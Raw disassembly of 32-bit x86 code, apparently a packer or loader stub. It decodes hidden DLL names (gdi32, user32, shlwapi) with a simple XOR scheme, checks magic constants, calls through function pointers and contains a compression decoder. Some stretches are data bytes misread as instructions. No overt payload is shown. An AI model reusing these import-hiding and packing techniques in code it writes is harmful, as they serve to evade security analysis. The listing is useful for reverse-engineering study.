  4252f6:	mov    eax,DWORD PTR [ebp+0xc]
  4252f9:	jmp    0x42530f
  4252fe:	mov    eax,DWORD PTR [ebp-0x4]
  425301:	mov    esi,DWORD PTR [ebp-0x8]
  425304:	xor    esi,ecx
  425306:	xor    eax,ecx
  425308:	add    esi,edx
  42530a:	add    eax,edx
  42530c:	imul   eax,esi
  42530f:	pop    edi
  425310:	pop    esi
  425311:	leave  
  425312:	ret    0x8
	...
  425321:	add    BYTE PTR [eax],al
  425323:	add    BYTE PTR [ebp+0x4de645],dh
  425329:	add    BYTE PTR [eax],al
  42532b:	add    BYTE PTR [edx],al
  42532d:	add    BYTE PTR [eax],al
  42532f:	add    BYTE PTR [eax],dh
  425331:	add    BYTE PTR [eax],al
  425333:	add    BYTE PTR [eax+0x53],al
  425336:	add    al,BYTE PTR [eax]
  425338:	inc    eax
  425339:	inc    edi
  42533a:	add    al,BYTE PTR [eax]
  42533c:	add    BYTE PTR [eax],al
  42533e:	add    BYTE PTR [eax],al
  425340:	push   edx
  425341:	push   ebx
  425342:	inc    esp
  425343:	push   ebx
  425344:	inc    esp
  425345:	jg     0x4252de
  425347:	and    DWORD PTR [ebp-0x55bbc25a],eax
  42534d:	pcmpeqb mm7,mm2
  425350:	cs stc 
  425352:	sbb    cl,BYTE PTR [esi+0x1]
  425355:	add    BYTE PTR [eax],al
  425357:	add    BYTE PTR [esi+0x3a],al
  42535a:	pop    esp
  42535b:	push   edi
  42535c:	imul   ebp,DWORD PTR [esi+0x64],0x2073776f
  425363:	inc    esp
  425364:	imul   esi,DWORD PTR [edx+0x5c],0x656c6946
  42536b:	inc    ebp
  42536c:	js     0x4253d3
  42536e:	arpl   WORD PTR [eax],ax
  425370:	mov    edx,DWORD PTR [ebp-0x14]
  425373:	sub    esp,0x108
  425379:	push   ebx
  42537a:	mov    eax,ebx
  42537c:	xchg   ecx,eax
  42537d:	mov    eax,DWORD PTR [ebp+0x8]
  425380:	cmp    eax,0xf89c85a5
  425385:	jne    0x42583f
  42538b:	mov    eax,DWORD PTR [ebp+0xc]
  42538e:	cmp    eax,0xf89c85ba
  425393:	jne    0x42583f
  425399:	mov    eax,DWORD PTR [ebp+0x24]
  42539c:	mov    DWORD PTR [ebp-0x4],eax
  42539f:	mov    eax,DWORD PTR [ebp-0x4]
  4253a2:	mov    eax,DWORD PTR [eax+0x1d8]
  4253a8:	mov    eax,DWORD PTR [eax]
  4253aa:	mov    eax,DWORD PTR [eax]
  4253ac:	mov    DWORD PTR [ebp-0x8],eax
  4253af:	mov    BYTE PTR [ebp-0x18],0x1a
  4253b3:	mov    BYTE PTR [ebp-0x17],0x1f
  4253b7:	mov    BYTE PTR [ebp-0x16],0x14
  4253bb:	mov    BYTE PTR [ebp-0x15],0x4e
  4253bf:	mov    BYTE PTR [ebp-0x14],0x4d
  4253c3:	mov    BYTE PTR [ebp-0x13],0x83
  4253c7:	mov    BYTE PTR [ebp-0x20],0x8
  4253cb:	mov    BYTE PTR [ebp-0x1f],0xe
  4253cf:	mov    BYTE PTR [ebp-0x1e],0x18
  4253d3:	mov    BYTE PTR [ebp-0x1d],0xd
  4253d7:	mov    BYTE PTR [ebp-0x1c],0x4e
  4253db:	mov    BYTE PTR [ebp-0x1b],0x4d
  4253df:	mov    BYTE PTR [ebp-0x1a],0x83
  4253e3:	mov    BYTE PTR [ebp-0x28],0xe
  4253e7:	mov    BYTE PTR [ebp-0x27],0x1b
  4253eb:	mov    BYTE PTR [ebp-0x26],0x17
  4253ef:	mov    BYTE PTR [ebp-0x25],0xa
  4253f3:	mov    BYTE PTR [ebp-0x24],0x1c
  4253f7:	mov    BYTE PTR [ebp-0x23],0x13
  4253fb:	mov    BYTE PTR [ebp-0x22],0x14
  4253ff:	mov    BYTE PTR [ebp-0x21],0x83
  425403:	xor    ecx,ecx
  425405:	lea    eax,[ebp+ecx*1-0x18]
  425409:	movzx  edx,BYTE PTR [eax]
  42540c:	xor    edx,0x7c
  42540f:	inc    edx
  425410:	inc    ecx
  425411:	mov    BYTE PTR [eax],dl
  425413:	cmp    ecx,0x6
  425416:	jb     0x425405
  425418:	xor    ecx,ecx
  42541a:	lea    eax,[ebp+ecx*1-0x20]
  42541e:	movzx  edx,BYTE PTR [eax]
  425421:	xor    edx,0x7c
  425424:	inc    edx
  425425:	inc    ecx
  425426:	mov    BYTE PTR [eax],dl
  425428:	cmp    ecx,0x7
  42542b:	jb     0x42541a
  42542d:	xor    ecx,ecx
  42542f:	lea    eax,[ebp+ecx*1-0x28]
  425433:	movzx  edx,BYTE PTR [eax]
  425436:	xor    edx,0x7c
  425439:	inc    edx
  42543a:	inc    ecx
  42543b:	mov    BYTE PTR [eax],dl
  42543d:	cmp    ecx,0x8
  425440:	jb     0x42542f
  425442:	lea    eax,[ebp-0x2c]
  425445:	mov    DWORD PTR [ebp-0x8],eax
  425448:	mov    ecx,DWORD PTR [ebp-0x8]
  42544b:	mov    eax,0x7113fccf
  425450:	mov    DWORD PTR [ecx],eax
  425452:	mov    ecx,DWORD PTR [ebp-0x2c]
  425455:	push   esi
  425456:	push   edi
  425457:	mov    esi,0x4e3e
  42545c:	mov    ebx,0x3272f1
  425461:	cmp    ecx,eax
  425463:	jne    0x42552e
  425469:	lea    eax,[esi+0x39]
  42546c:	mov    WORD PTR [ebp-0x78],ax
  425470:	mov    eax,esi
  425472:	mov    WORD PTR [ebp-0x76],ax
  425476:	add    eax,0x33
  425479:	mov    WORD PTR [ebp-0x74],ax
  42547d:	lea    eax,[esi-0xe]
  425480:	mov    WORD PTR [ebp-0x72],ax
  425484:	add    eax,0x4f
  425487:	mov    ecx,eax
  425489:	lea    eax,[esi-0x15]
  42548c:	mov    WORD PTR [ebp-0x66],ax
  425490:	mov    eax,esi
  425492:	mov    WORD PTR [ebp-0x64],ax
  425496:	add    eax,0xffffffec
  425499:	mov    WORD PTR [ebp-0x62],ax
  42549d:	mov    eax,0x443
  4254a2:	mov    WORD PTR [ebp-0x60],ax
  4254a6:	mov    eax,0x5674
  4254ab:	mov    WORD PTR [ebp-0x5e],ax
  4254af:	mov    eax,0x6114
  4254b4:	mov    WORD PTR [ebp-0x5c],ax
  4254b8:	lea    eax,[ebp-0xe0]
  4254be:	push   eax
  4254bf:	mov    eax,DWORD PTR [ebp+0xc]
  4254c2:	mov    edi,0x75108aa
  4254c7:	xor    eax,edi
  4254c9:	add    eax,ebx
  4254cb:	push   eax
  4254cc:	mov    WORD PTR [ebp-0x70],cx
  4254d0:	lea    ecx,[esi-0xa]
  4254d3:	mov    edx,ecx
  4254d5:	lea    eax,[ebp-0x78]
  4254d8:	push   eax
  4254d9:	mov    eax,DWORD PTR [ebp-0x4]
  4254dc:	mov    eax,DWORD PTR [eax+0x198]
  4254e2:	mov    WORD PTR [ebp-0x6e],dx
  4254e6:	mov    edx,0x4f8a
  4254eb:	mov    WORD PTR [ebp-0x6c],dx
  4254ef:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e35
  4254f6:	mov    DWORD PTR [ebp-0x5a],0x4e34f1e6
  4254fd:	mov    DWORD PTR [ebp-0xe0],0x1
  425507:	mov    DWORD PTR [ebp-0xdc],0x255
  425511:	push   DWORD PTR [eax]
  425513:	mov    eax,DWORD PTR [ebp+0x10]
  425516:	call   eax
  425518:	mov    DWORD PTR [ebp-0x8],eax
  42551b:	mov    eax,DWORD PTR [ebp-0x8]
  42551e:	test   eax,eax
  425520:	je     0x425533
  425522:	xor    DWORD PTR ds:0x76586876,0x87687666
  42552c:	jmp    0x425533
  42552e:	mov    edi,0x75108aa
  425533:	mov    eax,DWORD PTR [ebp-0x4]
  425536:	mov    ecx,DWORD PTR [eax+0x18c]
  42553c:	xor    eax,eax
  42553e:	cmp    DWORD PTR [ecx],eax
  425540:	jne    0x4257b2
  425546:	mov    ecx,DWORD PTR [ebp-0x4]
  425549:	mov    ecx,DWORD PTR [ecx+0x17c]
  42554f:	mov    DWORD PTR [ecx],eax
  425551:	mov    ecx,DWORD PTR [ebp-0x4]
  425554:	mov    ecx,DWORD PTR [ecx+0x180]
  42555a:	mov    DWORD PTR [ecx],eax
  42555c:	mov    eax,0x4e61
  425561:	mov    WORD PTR [ebp-0x9c],ax
  425568:	mov    eax,esi
  42556a:	mov    WORD PTR [ebp-0x9a],ax
  425571:	mov    eax,0x4e71
  425576:	mov    WORD PTR [ebp-0x98],ax
  42557d:	add    eax,0xffffffc0
  425580:	mov    WORD PTR [ebp-0x96],ax
  425587:	mov    eax,0x4f8e
  42558c:	mov    WORD PTR [ebp-0x94],ax
  425593:	mov    eax,0x4e32
  425598:	mov    WORD PTR [ebp-0x92],ax
  42559f:	add    eax,0x4d
  4255a2:	mov    WORD PTR [ebp-0x90],ax
  4255a9:	mov    eax,0x4e34
  4255ae:	mov    WORD PTR [ebp-0x8e],ax
  4255b5:	mov    eax,esi
  4255b7:	mov    WORD PTR [ebp-0x8c],ax
  4255be:	mov    eax,0x4e35
  4255c3:	mov    WORD PTR [ebp-0x8a],ax
  4255ca:	mov    eax,0x99f1
  4255cf:	mov    WORD PTR [ebp-0x88],ax
  4255d6:	mov    eax,0x8d62
  4255db:	mov    WORD PTR [ebp-0x86],ax
  4255e2:	mov    eax,0xd66f
  4255e7:	mov    WORD PTR [ebp-0x84],ax
  4255ee:	mov    eax,0xd783
  4255f3:	mov    WORD PTR [ebp-0x82],ax
  4255fa:	mov    eax,0x2784
  4255ff:	mov    WORD PTR [ebp-0x80],ax
  425603:	mov    eax,0x4784
  425608:	mov    WORD PTR [ebp-0x7e],ax
  42560c:	mov    eax,0x4e33
  425611:	push   0x8
  425613:	mov    WORD PTR [ebp-0x7c],ax
  425617:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  42561e:	mov    DWORD PTR [ebp-0xc],0x8314131c
  425625:	lea    eax,[ebp-0x10]
  425628:	pop    ecx
  425629:	mov    dl,BYTE PTR [eax]
  42562b:	xor    dl,0x7c
  42562e:	inc    dl
  425630:	mov    BYTE PTR [eax],dl
  425632:	inc    eax
  425633:	dec    ecx
  425634:	jne    0x425629
  425636:	lea    eax,[ebp-0x10]
  425639:	mov    DWORD PTR [ebp-0xdc],eax
  42563f:	lea    eax,[ebp-0xe0]
  425645:	push   eax
  425646:	mov    eax,DWORD PTR [ebp+0xc]
  425649:	xor    eax,edi
  42564b:	add    eax,ebx
  42564d:	push   eax
  42564e:	mov    eax,DWORD PTR [ebp-0x4]
  425651:	add    eax,0x66
  425654:	push   eax
  425655:	mov    eax,DWORD PTR [ebp-0x4]
  425658:	mov    eax,DWORD PTR [eax+0x198]
  42565e:	mov    DWORD PTR [ebp-0xe0],0x1
  425668:	push   DWORD PTR [eax]
  42566a:	mov    eax,DWORD PTR [ebp+0x10]
  42566d:	call   eax
  42566f:	mov    ecx,DWORD PTR [ebp+0x8]
  425672:	xor    ecx,edi
  425674:	add    ecx,ebx
  425676:	mov    DWORD PTR [ebp-0x8],eax
  425679:	cmp    eax,ecx
  42567b:	jne    0x425696
  42567d:	mov    eax,ds:0x33730bcc
  425682:	or     eax,0x22150bcf
  425687:	mov    ds:0x33730bcc,eax
  42568c:	add    eax,0x3372e92f
  425691:	mov    ds:0x33730bcc,eax
  425696:	mov    ecx,0x4e66
  42569b:	mov    eax,ecx
  42569d:	mov    WORD PTR [ebp-0x40],ax
  4256a1:	add    eax,0x5
  4256a4:	mov    edx,eax
  4256a6:	mov    WORD PTR [ebp-0x3e],dx
  4256aa:	mov    edx,0x4f93
  4256af:	mov    WORD PTR [ebp-0x3c],dx
  4256b3:	add    edx,0xfffffff8
  4256b6:	mov    WORD PTR [ebp-0x3a],dx
  4256ba:	mov    edx,0x4f8d
  4256bf:	mov    WORD PTR [ebp-0x38],dx
  4256c3:	add    edx,0xfffffff3
  4256c6:	mov    WORD PTR [ebp-0x36],dx
  4256ca:	mov    edx,0x4f87
  4256cf:	mov    WORD PTR [ebp-0x34],dx
  4256d3:	mov    WORD PTR [ebp-0x32],cx
  4256d7:	mov    ecx,esi
  4256d9:	mov    WORD PTR [ebp-0x30],cx
  4256dd:	lea    ecx,[edx-0x1]
  4256e0:	mov    edx,ecx
  4256e2:	mov    WORD PTR [ebp-0x54],dx
  4256e6:	mov    edx,eax
  4256e8:	mov    WORD PTR [ebp-0x52],dx
  4256ec:	mov    edx,0x4e73
  4256f1:	mov    WORD PTR [ebp-0x50],dx
  4256f5:	mov    WORD PTR [ebp-0x4e],ax
  4256f9:	lea    eax,[edx-0x6]
  4256fc:	mov    WORD PTR [ebp-0x4c],ax
  425700:	add    eax,0xfffffff3
  425703:	mov    WORD PTR [ebp-0x4a],ax
  425707:	lea    eax,[edx-0xc]
  42570a:	mov    WORD PTR [ebp-0x48],ax
  42570e:	mov    WORD PTR [ebp-0x46],cx
  425712:	mov    WORD PTR [ebp-0x44],si
  425716:	mov    eax,DWORD PTR [ebp+0x8]
  425719:	movzx  ecx,WORD PTR [ebp-0x54]
  42571d:	xor    eax,edi
  42571f:	add    eax,ebx
  425721:	xor    eax,ecx
  425723:	mov    WORD PTR [ebp-0x54],ax
  425727:	mov    eax,DWORD PTR [ebp+0x8]
  42572a:	movzx  ecx,WORD PTR [ebp-0x40]
  42572e:	xor    eax,edi
  425730:	add    eax,ebx
  425732:	xor    eax,ecx
  425734:	mov    WORD PTR [ebp-0x40],ax
  425738:	xor    eax,eax
  42573a:	mov    WORD PTR [ebp-0xf4],ax
  425741:	mov    WORD PTR [ebp-0x108],ax
  425748:	mov    edi,DWORD PTR [ebp+0x24]
  42574b:	lea    eax,[ebp-0xf4]
  425751:	lea    edx,[ebp-0x54]
  425754:	mov    DWORD PTR [ebp-0xe0],0x2
  42575e:	mov    DWORD PTR [ebp-0xdc],eax
  425764:	call   0x42819b
  425769:	mov    DWORD PTR [ebp-0xd8],eax
  42576f:	lea    eax,[ebp-0xe0]
  425775:	push   eax
  425776:	mov    eax,DWORD PTR [ebp+0xc]
  425779:	xor    eax,0x75108aa
  42577e:	add    eax,ebx
  425780:	push   eax
  425781:	lea    eax,[ebp-0x9c]
  425787:	push   eax
  425788:	push   DWORD PTR [ebp-0x8]
  42578b:	mov    eax,DWORD PTR [ebp+0x10]
  42578e:	call   eax
  425790:	mov    edi,DWORD PTR [ebp+0x24]
  425793:	lea    eax,[ebp-0x108]
  425799:	lea    edx,[ebp-0x40]
  42579c:	mov    DWORD PTR [ebp-0xdc],eax
  4257a2:	call   0x42819b
  4257a7:	mov    DWORD PTR [ebp-0xd8],eax
  4257ad:	mov    edi,0x75108aa
  4257b2:	mov    eax,DWORD PTR [ebp+0x14]
  4257b5:	push   DWORD PTR [ebp-0x4]
  4257b8:	push   DWORD PTR [ebp+0x20]
  4257bb:	push   DWORD PTR [ebp+0x1c]
  4257be:	push   DWORD PTR [ebp+0x18]
  4257c1:	push   DWORD PTR [ebp+0x10]
  4257c4:	push   DWORD PTR [ebp+0x8]
  4257c7:	push   DWORD PTR [ebp+0xc]
  4257ca:	call   0x426a3c
  4257cf:	test   eax,eax
  4257d1:	je     0x425815
  4257d3:	add    DWORD PTR [ebp-0x4],eax
  4257d6:	push   DWORD PTR [ebp-0x4]
  4257d9:	lea    esi,[ebp+0x4]
  4257dc:	call   0x425c2d
  4257e1:	mov    eax,DWORD PTR [ebp-0x4]
  4257e4:	mov    eax,DWORD PTR [eax+0x1c8]
  4257ea:	mov    eax,DWORD PTR [eax]
  4257ec:	xor    eax,edi
  4257ee:	add    eax,ebx
  4257f0:	mov    eax,DWORD PTR [ebp-0x4]
  4257f3:	jne    0x42580b
  4257f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4257f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4257fe:	push   DWORD PTR [ecx]
  425800:	mov    eax,DWORD PTR [eax+0x1e0]
  425806:	call   DWORD PTR [eax+0x28]
  425809:	jmp    0x425815
  42580b:	mov    eax,DWORD PTR [eax+0x17c]
  425811:	mov    eax,DWORD PTR [eax]
  425813:	add    DWORD PTR [esi],eax
  425815:	mov    eax,DWORD PTR [ebp-0x4]
  425818:	mov    eax,DWORD PTR [eax+0x1dc]
  42581e:	dec    DWORD PTR [eax]
  425820:	mov    ecx,DWORD PTR [ebp-0x4]
  425823:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425829:	mov    eax,DWORD PTR [eax]
  42582b:	lea    eax,[ecx+eax*4]
  42582e:	mov    ecx,DWORD PTR [ebp-0x4]
  425831:	mov    ecx,DWORD PTR [ecx+0x17c]
  425837:	mov    eax,DWORD PTR [eax]
  425839:	mov    ecx,DWORD PTR [ecx]
  42583b:	add    DWORD PTR [eax],ecx
  42583d:	pop    edi
  42583e:	pop    esi
  42583f:	pop    ebx
  425840:	leave  
  425841:	ret    0x20
  425844:	push   edi
  425845:	push   esi
  425846:	push   ebx
  425847:	push   ebp
  425848:	mov    ebp,esp
  42584a:	mov    eax,DWORD PTR [ebp+0x24]
  42584d:	add    DWORD PTR [ebp+0x28],eax
  425850:	push   eax
  425851:	cld    
  425852:	mov    esi,DWORD PTR [ebp+0x18]
  425855:	add    DWORD PTR [ebp+0x1c],esi
  425858:	push   esi
  425859:	mov    esi,DWORD PTR [ebp+0x14]
  42585c:	lods   eax,DWORD PTR ds:[esi]
  42585d:	xchg   edx,eax
  42585e:	push   edx
  42585f:	mov    cl,BYTE PTR [esi-0x2]
  425862:	or     eax,0xffffffff
  425865:	shl    eax,cl
  425867:	not    eax
  425869:	push   eax
  42586a:	mov    cl,dh
  42586c:	or     eax,0xffffffff
  42586f:	shl    eax,cl
  425871:	not    eax
  425873:	push   eax
  425874:	add    cl,dl
  425876:	mov    edi,esi
  425878:	sub    esp,0xc
  42587b:	sub    eax,eax
  42587d:	inc    eax
  42587e:	push   eax
  42587f:	push   eax
  425880:	push   eax
  425881:	push   eax
  425882:	push   eax
  425883:	push   edi
  425884:	sub    esi,esi
  425886:	push   esi
  425887:	or     ebx,0xffffffff
  42588a:	mov    eax,0x300
  42588f:	shl    eax,cl
  425891:	lea    ecx,[eax+0x736]
  425897:	mov    eax,0x4000400
  42589c:	shr    ecx,1
  42589e:	rep stos DWORD PTR es:[edi],eax
  4258a0:	push   0x5
  4258a2:	pop    ecx
  4258a3:	call   0x425b8e
  4258a8:	loop   0x4258a3
  4258aa:	lea    esi,[esi]
  4258ac:	lea    edi,[edi]
  4258ae:	mov    edi,DWORD PTR [ebp-0x4]
  4258b1:	mov    eax,DWORD PTR [ebp-0x10]
  4258b4:	sub    edi,DWORD PTR [ebp+0x24]
  4258b7:	and    eax,edi
  4258b9:	mov    DWORD PTR [ebp-0x18],eax
  4258bc:	mov    al,0x0
  4258be:	call   0x425ba6
  4258c3:	jne    0x42595e
  4258c9:	mov    cl,BYTE PTR [ebp-0xc]
  4258cc:	and    edi,DWORD PTR [ebp-0x14]
  4258cf:	shl    edi,cl
  4258d1:	sub    cl,0x8
  4258d4:	neg    cl
  4258d6:	shr    esi,cl
  4258d8:	pop    eax
  4258d9:	add    edi,esi
  4258db:	pop    esi
  4258dc:	lea    edi,[edi+edi*2]
  4258df:	shl    edi,0x8
  4258e2:	cmp    al,0x7
  4258e4:	pop    edx
  4258e5:	lea    ecx,[esi+edi*2+0xe6c]
  4258ec:	push   ecx
  4258ed:	push   esi
  4258ee:	mov    esi,0x100
  4258f3:	push   eax
  4258f4:	mov    al,0x1
  4258f6:	jb     0x42592c
  4258f8:	mov    edi,DWORD PTR [ebp-0x4]
  4258fb:	sub    edi,DWORD PTR [ebp-0x24]
  4258fe:	movzx  edi,BYTE PTR [edi]
  425901:	mov    ebp,DWORD PTR [ebp-0x34]
  425904:	shl    edi,1
  425906:	mov    ecx,esi
  425908:	and    esi,edi
  42590a:	add    ecx,esi
  42590c:	lea    ebp,[ebp+ecx*2+0x0]
  425910:	call   0x425bc5
  425915:	mov    ecx,eax
  425917:	shr    esi,0x8
  42591a:	and    ecx,0x1
  42591d:	cmp    esi,ecx
  42591f:	mov    esi,0x100
  425924:	jne    0x425934
  425926:	cmp    eax,esi
  425928:	jb     0x425901
  42592a:	jmp    0x425940
  42592c:	mov    ebp,DWORD PTR [ebp-0x34]
  42592f:	call   0x425bc5
  425934:	inc    eax
  425935:	inc    esi
  425936:	sub    eax,0x1
  425939:	sub    esi,0x1
  42593c:	cmp    eax,esi
  42593e:	jb     0x42592c
  425940:	pop    edx
  425941:	inc    edx
  425942:	cmp    edx,0x5
  425945:	dec    edx
  425946:	mov    ecx,edx
  425948:	jb     0x425959
  42594a:	inc    edx
  42594b:	cmp    edx,0xb
  42594e:	dec    edx
  42594f:	mov    cl,0x4
  425951:	dec    cl
  425953:	jb     0x425959
  425955:	mov    cl,0x7
  425957:	dec    cl
  425959:	sub    edx,ecx
  42595b:	push   edx
  42595c:	jmp    0x4259ad
  42595e:	mov    al,0xc1
  425960:	dec    al
  425962:	call   0x425bb6
  425967:	jne    0x42597d
  425969:	pop    eax
  42596a:	pop    edi
  42596b:	pop    edx
  42596c:	pop    ecx
  42596d:	pop    edx
  42596e:	pop    ecx
  42596f:	push   DWORD PTR [esp]
  425972:	push   ecx
  425973:	push   edx
  425974:	mov    edx,0x664
  425979:	mov    cl,0x0
  42597b:	jmp    0x4259f0
  42597d:	mov    al,0xcd
  42597f:	dec    al
  425981:	call   0x425bb6
  425986:	jne    0x4259b6
  425988:	mov    al,0xf1
  42598a:	dec    al
  42598c:	call   0x425ba6
  425991:	jne    0x4259e6
  425993:	pop    eax
  425994:	cmp    al,0x7
  425996:	mov    al,0x9
  425998:	jb     0x42599c
  42599a:	mov    al,0xb
  42599c:	push   eax
  42599d:	mov    esi,DWORD PTR [ebp-0x4]
  4259a0:	sub    esi,DWORD PTR [ebp-0x24]
  4259a3:	cmp    esi,DWORD PTR [ebp+0x24]
  4259a6:	jb     0x425b7d
  4259ac:	lods   al,BYTE PTR ds:[esi]
  4259ad:	mov    edi,DWORD PTR [ebp-0x4]
  4259b0:	stos   BYTE PTR es:[edi],al
  4259b1:	jmp    0x425b44
  4259b6:	mov    al,0xd8
  4259b8:	call   0x425bb6
  4259bd:	mov    esi,DWORD PTR [ebp-0x28]
  4259c0:	je     0x4259dd
  4259c2:	mov    al,0xe4
  4259c4:	call   0x425bb6
  4259c9:	mov    esi,DWORD PTR [ebp-0x2c]
  4259cc:	je     0x4259d7
  4259ce:	mov    esi,DWORD PTR [ebp-0x30]
  4259d1:	mov    ecx,DWORD PTR [ebp-0x2c]
  4259d4:	mov    DWORD PTR [ebp-0x30],ecx
  4259d7:	mov    ecx,DWORD PTR [ebp-0x28]
  4259da:	mov    DWORD PTR [ebp-0x2c],ecx
  4259dd:	mov    ecx,DWORD PTR [ebp-0x24]
  4259e0:	mov    DWORD PTR [ebp-0x28],ecx
  4259e3:	mov    DWORD PTR [ebp-0x24],esi
  4259e6:	pop    eax
  4259e7:	pop    edi
  4259e8:	pop    ecx
  4259e9:	mov    edx,0xa68
  4259ee:	mov    cl,0x8
  4259f0:	add    edx,edi
  4259f2:	push   edx
  4259f3:	push   edi
  4259f4:	cmp    al,0x7
  4259f6:	mov    al,cl
  4259f8:	jb     0x4259fc
  4259fa:	add    al,0x3
  4259fc:	push   eax
  4259fd:	mov    ebp,DWORD PTR [ebp-0x34]
  425a00:	call   0x425bc3
  425a05:	jne    0x425a1b
  425a07:	mov    eax,DWORD PTR [ebp-0x18]
  425a0a:	mov    edi,DWORD PTR [ebp-0x34]
  425a0d:	shl    eax,0x3
  425a10:	sub    ecx,ecx
  425a12:	push   0x8
  425a14:	pop    esi
  425a15:	lea    edi,[edi+eax*2+0x4]
  425a19:	jmp    0x425a50
  425a1b:	mov    ebp,DWORD PTR [ebp-0x34]
  425a1e:	add    ebp,0x2
  425a21:	call   0x425bc3
  425a26:	jne    0x425a40
  425a28:	mov    eax,DWORD PTR [ebp-0x18]
  425a2b:	mov    edi,DWORD PTR [ebp-0x34]
  425a2e:	shl    eax,0x3
  425a31:	push   0x8
  425a33:	pop    ecx
  425a34:	push   0x8
  425a36:	pop    esi
  425a37:	lea    edi,[edi+eax*2+0x104]
  425a3e:	jmp    0x425a50
  425a40:	mov    edi,0x204
  425a45:	add    edi,DWORD PTR [ebp-0x34]
  425a48:	push   0x10
  425a4a:	pop    ecx
  425a4b:	mov    esi,0x100
  425a50:	mov    DWORD PTR [ebp-0x1c],ecx
  425a53:	sub    eax,eax
  425a55:	inc    eax
  425a56:	mov    ebp,edi
  425a58:	call   0x425bc5
  425a5d:	mov    ecx,eax
  425a5f:	sub    ecx,esi
  425a61:	jb     0x425a56
  425a63:	add    DWORD PTR [ebp-0x1c],ecx
  425a66:	cmp    DWORD PTR [ebp-0x3c],0x4
  425a6a:	jae    0x425b20
  425a70:	add    DWORD PTR [ebp-0x3c],0x7
  425a74:	mov    ecx,DWORD PTR [ebp-0x1c]
  425a77:	cmp    ecx,0x4
  425a7a:	jb     0x425a7f
  425a7c:	push   0x3
  425a7e:	pop    ecx
  425a7f:	mov    edi,DWORD PTR [ebp-0x38]
  425a82:	shl    ecx,0x6
  425a85:	sub    eax,eax
  425a87:	inc    eax
  425a88:	push   0x40
  425a8a:	pop    esi
  425a8b:	lea    edi,[edi+ecx*2+0x360]
  425a92:	mov    ebp,edi
  425a94:	call   0x425bc5
  425a99:	mov    ecx,eax
  425a9b:	sub    ecx,esi
  425a9d:	jb     0x425a92
  425a9f:	mov    DWORD PTR [ebp-0x18],ecx
  425aa2:	mov    DWORD PTR [ebp-0x24],ecx
  425aa5:	cmp    ecx,0x4
  425aa8:	jb     0x425b1d
  425aaa:	mov    esi,ecx
  425aac:	and    DWORD PTR [ebp-0x24],0x1
  425ab0:	shr    esi,1
  425ab2:	or     DWORD PTR [ebp-0x24],0x2
  425ab6:	dec    esi
  425ab7:	cmp    ecx,0xe
  425aba:	jae    0x425ad5
  425abc:	mov    eax,0x2af
  425ac1:	sub    eax,ecx
  425ac3:	mov    ecx,esi
  425ac5:	shl    BYTE PTR [ebp-0x24],cl
  425ac8:	add    eax,DWORD PTR [ebp-0x24]
  425acb:	shl    eax,1
  425acd:	add    eax,DWORD PTR [ebp-0x38]
  425ad0:	mov    DWORD PTR [ebp-0x34],eax
  425ad3:	jmp    0x425b02
  425ad5:	sub    esi,0x4
  425ad8:	call   0x425b82
  425add:	shr    ebx,1
  425adf:	shl    DWORD PTR [ebp-0x24],1
  425ae2:	cmp    DWORD PTR [ebp-0x20],ebx
  425ae5:	jb     0x425aed
  425ae7:	inc    DWORD PTR [ebp-0x24]
  425aea:	sub    DWORD PTR [ebp-0x20],ebx
  425aed:	dec    esi
  425aee:	jne    0x425ad8
  425af0:	mov    eax,0x644
  425af5:	add    eax,DWORD PTR [ebp-0x38]
  425af8:	mov    DWORD PTR [ebp-0x34],eax
  425afb:	shl    DWORD PTR [ebp-0x24],0x4
  425aff:	push   0x4
  425b01:	pop    esi
  425b02:	sub    edi,edi
  425b04:	inc    edi
  425b05:	mov    eax,edi
  425b07:	mov    ebp,DWORD PTR [ebp-0x34]
  425b0a:	call   0x425bc5
  425b0f:	test   al,0x1
  425b11:	je     0x425b16
  425b13:	or     DWORD PTR [ebp-0x24],edi
  425b16:	shl    edi,1
  425b18:	dec    esi
  425b19:	jne    0x425b07
  425b1b:	jmp    0x425b1d
  425b1d:	inc    DWORD PTR [ebp-0x24]
  425b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  425b23:	add    ecx,0x2
  425b26:	mov    edi,DWORD PTR [ebp-0x4]
  425b29:	mov    eax,edi
  425b2b:	sub    eax,DWORD PTR [ebp+0x24]
  425b2e:	cmp    DWORD PTR [ebp-0x24],eax
  425b31:	ja     0x425b7d
  425b33:	mov    esi,edi
  425b35:	sub    esi,DWORD PTR [ebp-0x24]
  425b38:	mov    edx,DWORD PTR [ebp+0x28]
  425b3b:	lods   al,BYTE PTR ds:[esi]
  425b3c:	stos   BYTE PTR es:[edi],al
  425b3d:	cmp    edi,edx
  425b3f:	jae    0x425b44
  425b41:	dec    ecx
  425b42:	jne    0x425b3b
  425b44:	mov    DWORD PTR [ebp-0x4],edi
  425b47:	movzx  esi,al
  425b4a:	cmp    edi,DWORD PTR [ebp+0x28]
  425b4d:	jb     0x4258ae
  425b53:	call   0x425b82
  425b58:	sub    eax,eax
  425b5a:	lea    ebp,[esp+0x3c]
  425b5e:	mov    edx,DWORD PTR [ebp+0x20]
  425b61:	mov    esi,DWORD PTR [ebp-0x8]
  425b64:	sub    esi,DWORD PTR [ebp+0x18]
  425b67:	mov    DWORD PTR [edx],esi
  425b69:	mov    edx,DWORD PTR [ebp+0x2c]
  425b6c:	mov    edi,DWORD PTR [ebp-0x4]
  425b6f:	sub    edi,DWORD PTR [ebx+0x16]
  425b72:	lods   al,BYTE PTR ds:[esi]
  425b73:	outs   dx,BYTE PTR ds:[esi]
  425b74:	lods   eax,DWORD PTR ds:[esi]
  425b75:	repz inc DWORD PTR [ebx]
  425b78:	xchg   ecx,eax
  425b79:	test   BYTE PTR [esi-0x76cd1801],0x87
  425b80:	xor    eax,0x86758ce9
  425b85:	xchg   BYTE PTR [esi-0x6a75b076],al
  425b8b:	lea    edx,ds:0x5bb4dfa6
  425b91:	imul   esi,DWORD PTR [edx+0x5b],0xb41953f6
  425b98:	fwait
  425b99:	or     DWORD PTR [ebp-0x53c759f7],ecx
  425b9f:	fwait
  425ba0:	or     DWORD PTR [ebx+ebx*2-0x4b6a0097],ebp
  425ba7:	mov    ebx,0x8960c299
  425bac:	lea    ecx,ds:0x299b9296
  425bb2:	xchg   edx,eax
  425bb3:	lea    esi,ds:0x8960c29e
  425bb9:	xchg   edx,eax
  425bba:	fwait
  425bbb:	cdq    
  425bbc:	mov    ah,0x3b
  425bbe:	test   eax,0x869b37bc
